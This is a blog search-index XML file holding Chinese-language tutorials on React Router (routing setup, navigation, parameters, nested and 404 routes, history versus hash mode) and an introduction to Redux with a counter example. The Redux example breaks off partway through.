<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>React-路由</title>
      <link href="/2024/05/21/React-%E8%B7%AF%E7%94%B1/"/>
      <url>/2024/05/21/React-%E8%B7%AF%E7%94%B1/</url>
      
        <content type="html"><![CDATA[<h1 id="创建路由开发环境"><a href="#创建路由开发环境" class="headerlink" title="创建路由开发环境"></a>创建路由开发环境</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装最新的ReactRouter包</span></span><br><span class="line">npm i react-router-dom</span><br></pre></td></tr></table></figure><h2 id="简单的路由实例"><a href="#简单的路由实例" class="headerlink" title="简单的路由实例"></a>简单的路由实例</h2><p>在 <code>index.js</code> 中，实现一个简单的路由实例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ReactDOM</span> <span class="keyword">from</span> <span class="string">&#x27;react-dom/client&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Provider</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span>;</span><br><span class="line"><span class="comment">// 导入router组件</span></span><br><span class="line"><span class="keyword">import</span> &#123; createBrowserRouter, <span class="title class_">RouterProvider</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span>;</span><br><span class="line"><span class="comment">// 创建router实例对象并配置路由对应关系</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createBrowserRouter</span>([</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">App</span>&gt;</span><span class="tag">&lt;/<span class="name">App</span>&gt;</span></span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/login&#x27;</span>,</span><br><span class="line">    <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>我是登录页<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/article&#x27;</span>,</span><br><span class="line">    <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>我是文章页<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">])</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> root = <span class="title class_">ReactDOM</span>.<span class="title function_">createRoot</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;root&#x27;</span>));</span><br><span class="line">root.<span class="title function_">render</span>(</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Provider</span> <span class="attr">store</span>=<span class="string">&#123;store&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;/* 在组件中使用RouterProvider实现路由 */&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">RouterProvider</span> <span class="attr">router</span>=<span class="string">&#123;router&#125;</span>&gt;</span><span class="tag">&lt;/<span class="name">RouterProvider</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">Provider</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h1 id="抽象路由模块"><a href="#抽象路由模块" class="headerlink" title="抽象路由模块"></a>抽象路由模块</h1><p><strong>page&#x2F;模块</strong>：</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240521155333.png" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Login</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>我是登录页<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Login</span></span><br></pre></td></tr></table></figure><p><strong>router模块</strong>：</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240521155405.png" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;../App&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Login</span> <span class="keyword">from</span> <span class="string">&quot;../page/login&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Article</span> <span class="keyword">from</span> <span class="string">&quot;../page/article&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createBrowserRouter &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createBrowserRouter</span>([</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">App</span>&gt;</span><span class="tag">&lt;/<span class="name">App</span>&gt;</span></span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/login&#x27;</span>,</span><br><span class="line">    <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">Login</span>&gt;</span><span class="tag">&lt;/<span class="name">Login</span>&gt;</span></span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/article&#x27;</span>,</span><br><span class="line">    <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">Article</span>&gt;</span><span class="tag">&lt;/<span class="name">Article</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">])</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><p><strong>应用入口文件渲染 RouterProvider</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ReactDOM</span> <span class="keyword">from</span> <span class="string">&#x27;react-dom/client&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Provider</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span>;</span><br><span class="line"><span class="comment">// 导入router</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">RouterProvider</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> root = <span class="title class_">ReactDOM</span>.<span class="title function_">createRoot</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;root&#x27;</span>));</span><br><span class="line">root.<span class="title function_">render</span>(</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Provider</span> <span class="attr">store</span>=<span class="string">&#123;store&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    // 注入router</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">RouterProvider</span> <span class="attr">router</span>=<span class="string">&#123;router&#125;</span>&gt;</span><span class="tag">&lt;/<span class="name">RouterProvider</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">Provider</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h1 id="路由导航"><a href="#路由导航" class="headerlink" title="路由导航"></a>路由导航</h1><h2 id="声明式导航"><a href="#声明式导航" class="headerlink" title="声明式导航"></a>声明式导航</h2><p>声明式导航是指通过在模版中通过 <code>&lt;Link/&gt;</code>  组件描述出要跳转到哪里去</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Link</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Login</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>我是登录页<span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span>&gt;</span>主页<span class="tag">&lt;/<span class="name">Link</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Login</span></span><br></pre></td></tr></table></figure><p>通过给组件的to属性指定要跳转到路由path，组件会被渲染为浏览器支持的a链接，如果需要传参直接通过字符串拼接的方式拼接参数即可</p><h2 id="编程式导航"><a href="#编程式导航" class="headerlink" title="编程式导航"></a>编程式导航</h2><p>编程式导航是指通过 <code>useNavigate</code> 钩子得到导航方法，然后通过调用方法以命令式的形式进行路由跳转</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useNavigate &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Login</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> navigate = <span class="title function_">useNavigate</span>()</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>我是登录页</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> navigate(&#x27;/article&#x27;)&#125;&gt;文章<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Login</span></span><br></pre></td></tr></table></figure><p>通过调用 navigate方法 传入地址 path 实现跳转</p><h2 id="导航传参"><a href="#导航传参" class="headerlink" title="导航传参"></a>导航传参</h2><h3 id="searchParams-传参"><a href="#searchParams-传参" class="headerlink" title="searchParams 传参"></a>searchParams 传参</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原路由处传递参数</span></span><br><span class="line">&lt;button onClick=&#123;<span class="function">() =&gt;</span> <span class="title function_">navigate</span>(<span class="string">&#x27;/article?id=666&amp;name=Alien&#x27;</span>)&#125;&gt;文章(传参)&lt;/button&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目标路由处接收参数</span></span><br><span class="line"><span class="keyword">const</span> [params] = <span class="title function_">useSearchParams</span>()</span><br><span class="line">&lt;div&gt;&#123;params.<span class="title function_">get</span>(<span class="string">&#x27;id&#x27;</span>)&#125;&#123;params.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>)&#125;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="params-传参"><a href="#params-传参" class="headerlink" title="params 传参"></a>params 传参</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在router配置文件</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/login/:id&#x27;</span>,</span><br><span class="line">  <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">Login</span>&gt;</span><span class="tag">&lt;/<span class="name">Login</span>&gt;</span></span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原路由处传递参数</span></span><br><span class="line">&lt;button onClick=&#123;<span class="function">() =&gt;</span> <span class="title function_">navigate</span>(<span class="string">&#x27;/login/1001&#x27;</span>)&#125;&gt;登录(传参)&lt;/button&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目标路由处接收参数</span></span><br><span class="line"><span class="keyword">const</span> params = <span class="title function_">useParams</span>()</span><br><span class="line">&lt;div&gt;&#123;params.<span class="property">id</span>&#125;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h1 id="嵌套路由配置"><a href="#嵌套路由配置" class="headerlink" title="嵌套路由配置"></a>嵌套路由配置</h1><p><strong>实现步骤</strong>：</p><ol><li>使用 <code>children</code>属性配置路由嵌套关系</li><li>使用 <code>&lt;Outlet/&gt;</code> 组件配置二级路由渲染位置</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">  <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">Layout</span> /&gt;</span></span>,</span><br><span class="line">  <span class="attr">children</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;about&#x27;</span>,</span><br><span class="line">      <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">About</span> /&gt;</span></span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;board&#x27;</span>,</span><br><span class="line">      <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">Board</span> /&gt;</span></span>,</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Layout</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/about&quot;</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/board&quot;</span>&gt;</span>面板<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* 二级路由出口 */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Outlet</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="默认二级路由"><a href="#默认二级路由" class="headerlink" title="默认二级路由"></a>默认二级路由</h2><p>当访问的是一级路由时，默认的二级路由组件可以得到渲染，只需要在二级路由的位置去掉path，设置index属性为true</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">  <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">Layout</span> /&gt;</span></span>,</span><br><span class="line">  <span class="attr">children</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">index</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">About</span> /&gt;</span></span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;board&#x27;</span>,</span><br><span class="line">      <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">Board</span> /&gt;</span></span>,</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="404路由配置"><a href="#404路由配置" class="headerlink" title="404路由配置"></a>404路由配置</h2><p>场景：当浏览器输入url的路径在整个路由配置中都找不到对应的 path，为了用户体验，可以使用 404 兜底组件进行渲染</p><p><strong>实现步骤</strong>：</p><ol><li>准备一个 NotFound组件</li><li>在路由表数组的末尾，以<code>*</code>号作为路由path配置路由</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 准备一个 NotFound组件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">NotFound</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>404找不到目标<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">NotFound</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在路由表配置*号地址</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">  <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">NotFound</span>&gt;</span><span class="tag">&lt;/<span class="name">NotFound</span>&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="两种路由模式"><a href="#两种路由模式" class="headerlink" title="两种路由模式"></a>两种路由模式</h1><p>各个主流框架的路由常用的路由模式有俩种，<strong>history模式</strong> 和 <strong>hash模式</strong>，ReactRouter 分别由 <strong>createBrowerRouter</strong> 和 <strong>createHashRouter</strong> 函数负责创建</p><table><thead><tr><th>路由模式</th><th>url表现</th><th>底层原理</th><th>是否需要后端支持</th></tr></thead><tbody><tr><td>history</td><td>url&#x2F;login</td><td>history对象 + pushState事件</td><td>需要</td></tr><tr><td>hash</td><td>url&#x2F;#&#x2F;login</td><td>监听hashChange事件</td><td>不需要</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> react </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React-Redux集中状态管理工具</title>
      <link href="/2024/05/21/React-Redux%E9%9B%86%E4%B8%AD%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/05/21/React-Redux%E9%9B%86%E4%B8%AD%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="Redux-介绍"><a href="#Redux-介绍" class="headerlink" title="Redux 介绍"></a>Redux 介绍</h1><p>Redux 是 React 最常用的<strong>集中状态管理工具</strong>，类似于 Vue 中的 Pinia（Vuex），可以独立于框架运行  </p><p>作用：通过集中管理的方式管理应用的状态</p><p><strong>为什么要使用Redux？</strong></p><ol><li>独立于组件，无视组件之间的层级关系，简化通信问题</li><li>单项数据流清晰，易于定位bug</li><li>调试工具配套良好，方便调试</li></ol><p><strong>使用步骤</strong>：</p><ol><li>定义一个 reducer 函数 （根据当前想要做的修改返回一个新的状态）</li><li>使用 createStore 方法传入 reducer 函数 生成一个 store 实例对象</li><li>使用 store 实例的 subscribe 方法 订阅数据的变化（数据一旦变化，可以得到通知）</li><li>使用 store 实例的 dispatch 方法提交 action 对象 触发数据变化（告诉 reducer 你想怎么改数据）</li><li>使用 store 实例的 getState 方法 获取最新的状态数据更新到视图中</li></ol><p><strong>实现一个计数器</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;deBtn&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;count&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;inBtn&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 定义一个函数，根据想要的结果进行修改</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">counterReducer</span> (state=&#123;<span class="attr">count</span>: <span class="number">0</span>&#125;, action) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(action.<span class="property">type</span> === <span class="string">&#x27;INCREMENT&#x27;</span>) <span class="keyword">return</span> &#123;<span class="attr">count</span>: state.<span class="property">count</span> + <span class="number">1</span>&#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(action.<span class="property">type</span> === <span class="string">&#x27;DECREMENT&#x27;</span>) <span class="keyword">return</span> &#123;<span class="attr">count</span>: state.<span class="property">count</span> - <span class="number">1</span>&#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> state</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 通过createStore生成一个store实例对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> store = <span class="title class_">Redux</span>.<span class="title function_">createStore</span>(counterReducer)</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 订阅数据的变化，并做出反应，getState()获取最新的状态数据</span></span></span><br><span class="line"><span class="language-javascript">    store.<span class="title function_">subscribe</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;变化了&#x27;</span>, store.<span class="title function_">getState</span>())</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;count&#x27;</span>).<span class="property">innerText</span> = store.<span class="title function_">getState</span>().<span class="property">count</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// dispatch方法用于提交action对象，触发数据变化</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> inBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span 